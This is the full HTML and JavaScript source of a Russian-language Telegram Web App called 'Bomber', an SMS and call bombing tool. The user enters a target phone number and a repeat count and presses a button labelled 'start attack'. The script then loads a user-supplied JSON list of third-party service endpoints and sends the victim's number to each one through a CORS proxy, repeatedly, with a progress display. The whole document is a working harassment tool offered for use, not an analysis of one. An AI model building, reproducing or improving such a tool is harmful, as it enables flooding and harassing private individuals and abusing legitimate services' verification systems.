<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
    <title>Bomber ¬∑ crux edition</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --accent: #b0b0ff; 
            --bg-glow: radial-gradient(circle at 30% 20%, #1e1e2f, #0a0c14);
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
            -webkit-tap-highlight-color: transparent !important;
            touch-action: manipulation;
        }

        body {
            background: var(--bg-glow);
            color: #eaeaff;
            font-family: 'Inter', -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
        }

        #bg-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; 
            pointer-events: none; will-change: transform; transform: translateZ(0);
        }

        .card { 
            width: 100%; max-width: 320px; text-align: center; position: relative; z-index: 10;
            animation: entry-fade 1.2s cubic-bezier(0.22, 1, 0.36, 1) forwards;
            will-change: transform, opacity; transform: translateZ(0);
        }

        @keyframes entry-fade {
            0% { opacity: 0; transform: scale(0.95) translateY(10px); filter: blur(10px); }
            100% { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); }
        }

        .header { display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; gap: 4px; }
        .title { font-size: 2.2rem; font-weight: 700; color: #f0f0ff; text-shadow: 0 0 10px var(--accent); line-height: 1; }
        .bomb-emoji { font-size: 2.2rem; cursor: pointer; transition: transform 0.3s; display: inline-block; line-height: 1; }
        .bomb-emoji.active-anim { animation: moon-charge 0.7s ease-in-out forwards; }

        @keyframes moon-charge {
            0% { transform: scale(1); }
            40% { transform: scale(1.3); filter: brightness(1.5); }
            100% { transform: scale(1); }
        }

        .row { display: flex; justify-content: center; align-items: stretch; gap: 6px; margin-bottom: 1.5rem; position: relative; z-index: 20; }

        .phone-field {
            display: flex; align-items: center; background: rgba(18, 18, 30, 0.8);
            border: 1px solid #5f5f8f; border-radius: 14px; backdrop-filter: blur(8px);
            width: 185px; padding: 2px; transition: 0.3s;
        }
        
        .phone-field.invalid { border-color: #ff4444 !important; animation: shake 0.4s; }
        @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-4px);} 75% {transform: translateX(4px);} }

        .code-selector { padding: 0.3rem 0.5rem; cursor: pointer; border-right: 1px solid #5f5f8f; font-size: 0.8rem; color: #f0f0ff; position: relative; }
        .code-dropdown {
            position: absolute; top: calc(100% + 10px); left: 0; background: rgba(30, 30, 50, 0.98); 
            border: 2px solid var(--accent); border-radius: 14px; display: none; z-index: 1000; min-width: 160px;
        }
        .code-selector.active .code-dropdown { display: block; }
        .code-item { padding: 10px; font-size: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05); text-align: left; }

        .phone-number-input { background: transparent; border: none; color: #fff; font-size: 0.8rem; padding: 5px; outline: none; width: 100%; }

        .repeats {
            display: flex; align-items: center; gap: 3px; background: rgba(20, 20, 35, 0.7);
            border: 1px solid #5f5f8f; border-radius: 12px; padding: 0 8px;
        }
        .repeats-input { width: 30px; background: transparent; border: none; color: #fff; text-align: center; outline: none; font-weight: 700; font-size: 0.8rem; }
        .repeats-max { font-size: 0.6rem; color: #fff; background: rgba(180,180,255,0.1); padding: 3px 6px; border-radius: 6px; display: flex; align-items: center; gap: 4px; }

        .attack-btn {
            width: 210px; background: rgba(255, 255, 255, 0.08); border: 1px solid var(--accent);
            border-radius: 100px; color: #fff; padding: 12px; cursor: pointer; font-weight: 700; 
            text-transform: uppercase; letter-spacing: 2px; transition: 0.2s; transform: translateZ(0);
        }
        .attack-btn:active { transform: scale(0.96); }

        .settings-trigger { position: fixed; bottom: 20px; right: 20px; font-size: 1.5rem; color: var(--accent); opacity: 0.5; padding: 10px; cursor: pointer; }
        
        .settings-modal { position: fixed; inset: 0; background: rgba(5, 5, 15, 0.5); backdrop-filter: blur(20px); display: none; align-items: center; justify-content: center; z-index: 3000; }
        .settings-modal.active { display: flex; }
        .settings-content { background: rgba(20, 20, 35, 0.85); border: 1px solid var(--accent); border-radius: 28px; padding: 2rem; width: 320px; text-align: center; transform: translateZ(0); }

        .loading-overlay {
            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.95);
            display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 5000;
        }
        .loading-overlay.show { display: flex; }
        .progress-bg { width: 220px; height: 4px; background: rgba(255,255,255,0.05); border-radius: 10px; margin-top: 15px; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: var(--accent); transition: width 0.3s ease; }
    </style>
</head>
<body>

<canvas id="bg-canvas"></canvas>

<div class="card">
    <div class="header">
        <span class="title">Bomber</span>
        <span class="bomb-emoji" id="bombLogo">üí£</span>
    </div>
    
    <div class="row">
        <div class="phone-field" id="phoneBox">
            <div class="code-selector" id="codeSelector">
                <span id="selectedCode">üá∑üá∫ +7</span>
                <div class="code-dropdown" id="codeDropdown">
                    <div class="code-item" data-code="+7">üá∑üá∫ +7 (–†–§)</div>
                    <div class="code-item" data-code="+380">üá∫üá¶ +380 (–£–ö–†)</div>
                    <div class="code-item" data-code="+375">üáßüáæ +375 (–ë–õ–†)</div>
                    <div class="code-item" data-code="+7">üá∞üáø +7 (–ö–ó)</div>
                </div>
            </div>
            <input class="phone-number-input" type="text" id="localNumber" placeholder="912 345 67 89" inputmode="numeric">
        </div>
        
        <div class="repeats">
            <input class="repeats-input" type="number" id="repeat" value="3" min="1" max="100">
            <span class="repeats-max">
                <span id="servicesCounter">0</span>
            </span>
        </div>
    </div>
    
    <button class="attack-btn" id="go">–ù–ê–ß–ê–¢–¨ –ê–¢–ê–ö–£</button>
</div>

<div class="settings-trigger" id="openSettings">‚öô</div>

<div class="settings-modal" id="settingsModal">
    <div class="settings-content">
        <h3 style="margin-bottom:20px">–ù–∞—Å—Ç—Ä–æ–π–∫–∏</h3>
        <input type="text" id="repoUrl" style="width:100%; padding:10px; margin-bottom:15px; background:rgba(0,0,0,0.3); border:1px solid #5f5f8f; color:#fff; border-radius:10px; outline:none;" placeholder="JSON URL...">
        <button class="attack-btn" id="saveSettings" style="width:100%">–û–ö</button>
    </div>
</div>

<div class="loading-overlay" id="loadingOverlay">
    <div id="statusTxt" style="font-family: monospace;">–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞...</div>
    <div class="progress-bg"><div class="progress-fill" id="progressFill"></div></div>
    <button id="stopAttack" style="margin-top:20px; color:#ff4444; background:none; border:none; cursor:pointer;">–û–°–¢–ê–ù–û–í–ò–¢–¨</button>
</div>

<script>
    (function() {
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();

        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
        let particles = [], isAttacking = false, loadedServices = [];
        const proxyUrl = 'https://cors-anywhere.herokuapp.com/';

        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        window.addEventListener('resize', resize, { passive: true }); resize();

        class Particle {
            constructor() { this.reset(); }
            reset() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.v = 0.2 + Math.random() * 0.4;
            }
            update() { this.y -= this.v; if (this.y < 0) this.reset(); }
            draw() { ctx.fillStyle = '#b0b0ff'; ctx.fillRect(this.x, this.y, 1.2, 1.2); }
        }

        for(let i=0; i<50; i++) particles.push(new Particle());

        function anim() {
            ctx.fillStyle = '#0a0c14';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.globalAlpha = 0.4;
            for(let p of particles) { p.update(); p.draw(); }
            requestAnimationFrame(anim);
        }
        anim();

        // 1. –ó–ê–ì–†–£–ó–ö–ê
        const loadServices = async () => {
            const url = localStorage.getItem('crux_url');
            if (url) {
                try {
                    const r = await fetch(url);
                    loadedServices = await r.json();
                } catch(e) { loadedServices = []; }
            }
            document.getElementById('servicesCounter').innerText = loadedServices.length;
        };
        loadServices();

        // 2. –û–¢–ü–†–ê–í–ö–ê
        async function sendReq(s, phone) {
            const url = proxyUrl + s.url.replace('%phone%', phone);
            const options = {
                method: s.method || 'POST',
                headers: { ...(s.headers || {}), 'X-Requested-With': 'XMLHttpRequest' }
            };
            if(s.body) {
                options.body = typeof s.body === 'string' ? s.body.replace('%phone%', phone) : JSON.stringify(s.body).replace('%phone%', phone);
            }
            try { await fetch(url, options); } catch(e) {}
        }

        // 3. –ê–¢–ê–ö–ê
        document.getElementById('go').onclick = async () => {
            const numPart = document.getElementById('localNumber').value.replace(/\D/g,'');
            if(numPart.length < 7) {
                tg.HapticFeedback.notificationOccurred('warning');
                document.getElementById('phoneBox').classList.add('invalid');
                setTimeout(() => document.getElementById('phoneBox').classList.remove('invalid'), 400);
                return;
            }

            if(loadedServices.length === 0) {
                tg.showAlert("–°–Ω–∞—á–∞–ª–∞ —É–∫–∞–∂–∏ URL JSON-—Ñ–∞–π–ª–∞ –≤ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞—Ö (‚öô)");
                return;
            }

            const reps = parseInt(document.getElementById('repeat').value) || 1;
            const fullPhone = document.getElementById('selectedCode').innerText.replace(/\D/g,'') + numPart;
            
            isAttacking = true;
            document.getElementById('loadingOverlay').classList.add('show');
            tg.HapticFeedback.impactOccurred('heavy');

            const total = loadedServices.length * reps;
            let count = 0;

            for(let i=0; i<reps && isAttacking; i++) {
                for(const s of loadedServices) {
                    if(!isAttacking) break;
                    await sendReq(s, fullPhone);
                    count++;
                    document.getElementById('progressFill').style.width = (count/total*100) + '%';
                    document.getElementById('statusTxt').innerText = `–ê—Ç–∞–∫–∞: ${count}/${total}`;
                    await new Promise(r => setTimeout(r, 200));
                }
            }
            isAttacking = false;
            document.getElementById('loadingOverlay').classList.remove('show');
            tg.HapticFeedback.notificationOccurred('success');
        };

        // 4. –ò–ù–¢–ï–†–§–ï–ô–°
        document.getElementById('openSettings').onclick = () => {
            document.getElementById('repoUrl').value = localStorage.getItem('crux_url') || '';
            document.getElementById('settingsModal').classList.add('active');
        };
        
        document.getElementById('saveSettings').onclick = () => {
            localStorage.setItem('crux_url', document.getElementById('repoUrl').value);
            loadServices();
            document.getElementById('settingsModal').classList.remove('active');
        };
        
        document.getElementById('codeSelector').onclick = (e) => {
            e.stopPropagation();
            document.getElementById('codeSelector').classList.toggle('active');
        };
        
        document.querySelectorAll('.code-item').forEach(i => {
            i.onclick = () => {
                document.getElementById('selectedCode').innerText = i.dataset.code;
                document.getElementById('codeSelector').classList.remove('active');
            };
        });
        
        document.getElementById('stopAttack').onclick = () => {
            isAttacking = false;
            document.getElementById('loadingOverlay').classList.remove('show');
        };
        
        document.getElementById('bombLogo').onclick = () => {
            tg.HapticFeedback.selectionChanged();
            document.getElementById('bombLogo').classList.add('active-anim');
            setTimeout(() => document.getElementById('bombLogo').classList.remove('active-anim'), 700);
        };
    })();
</script>
</body>
</html>
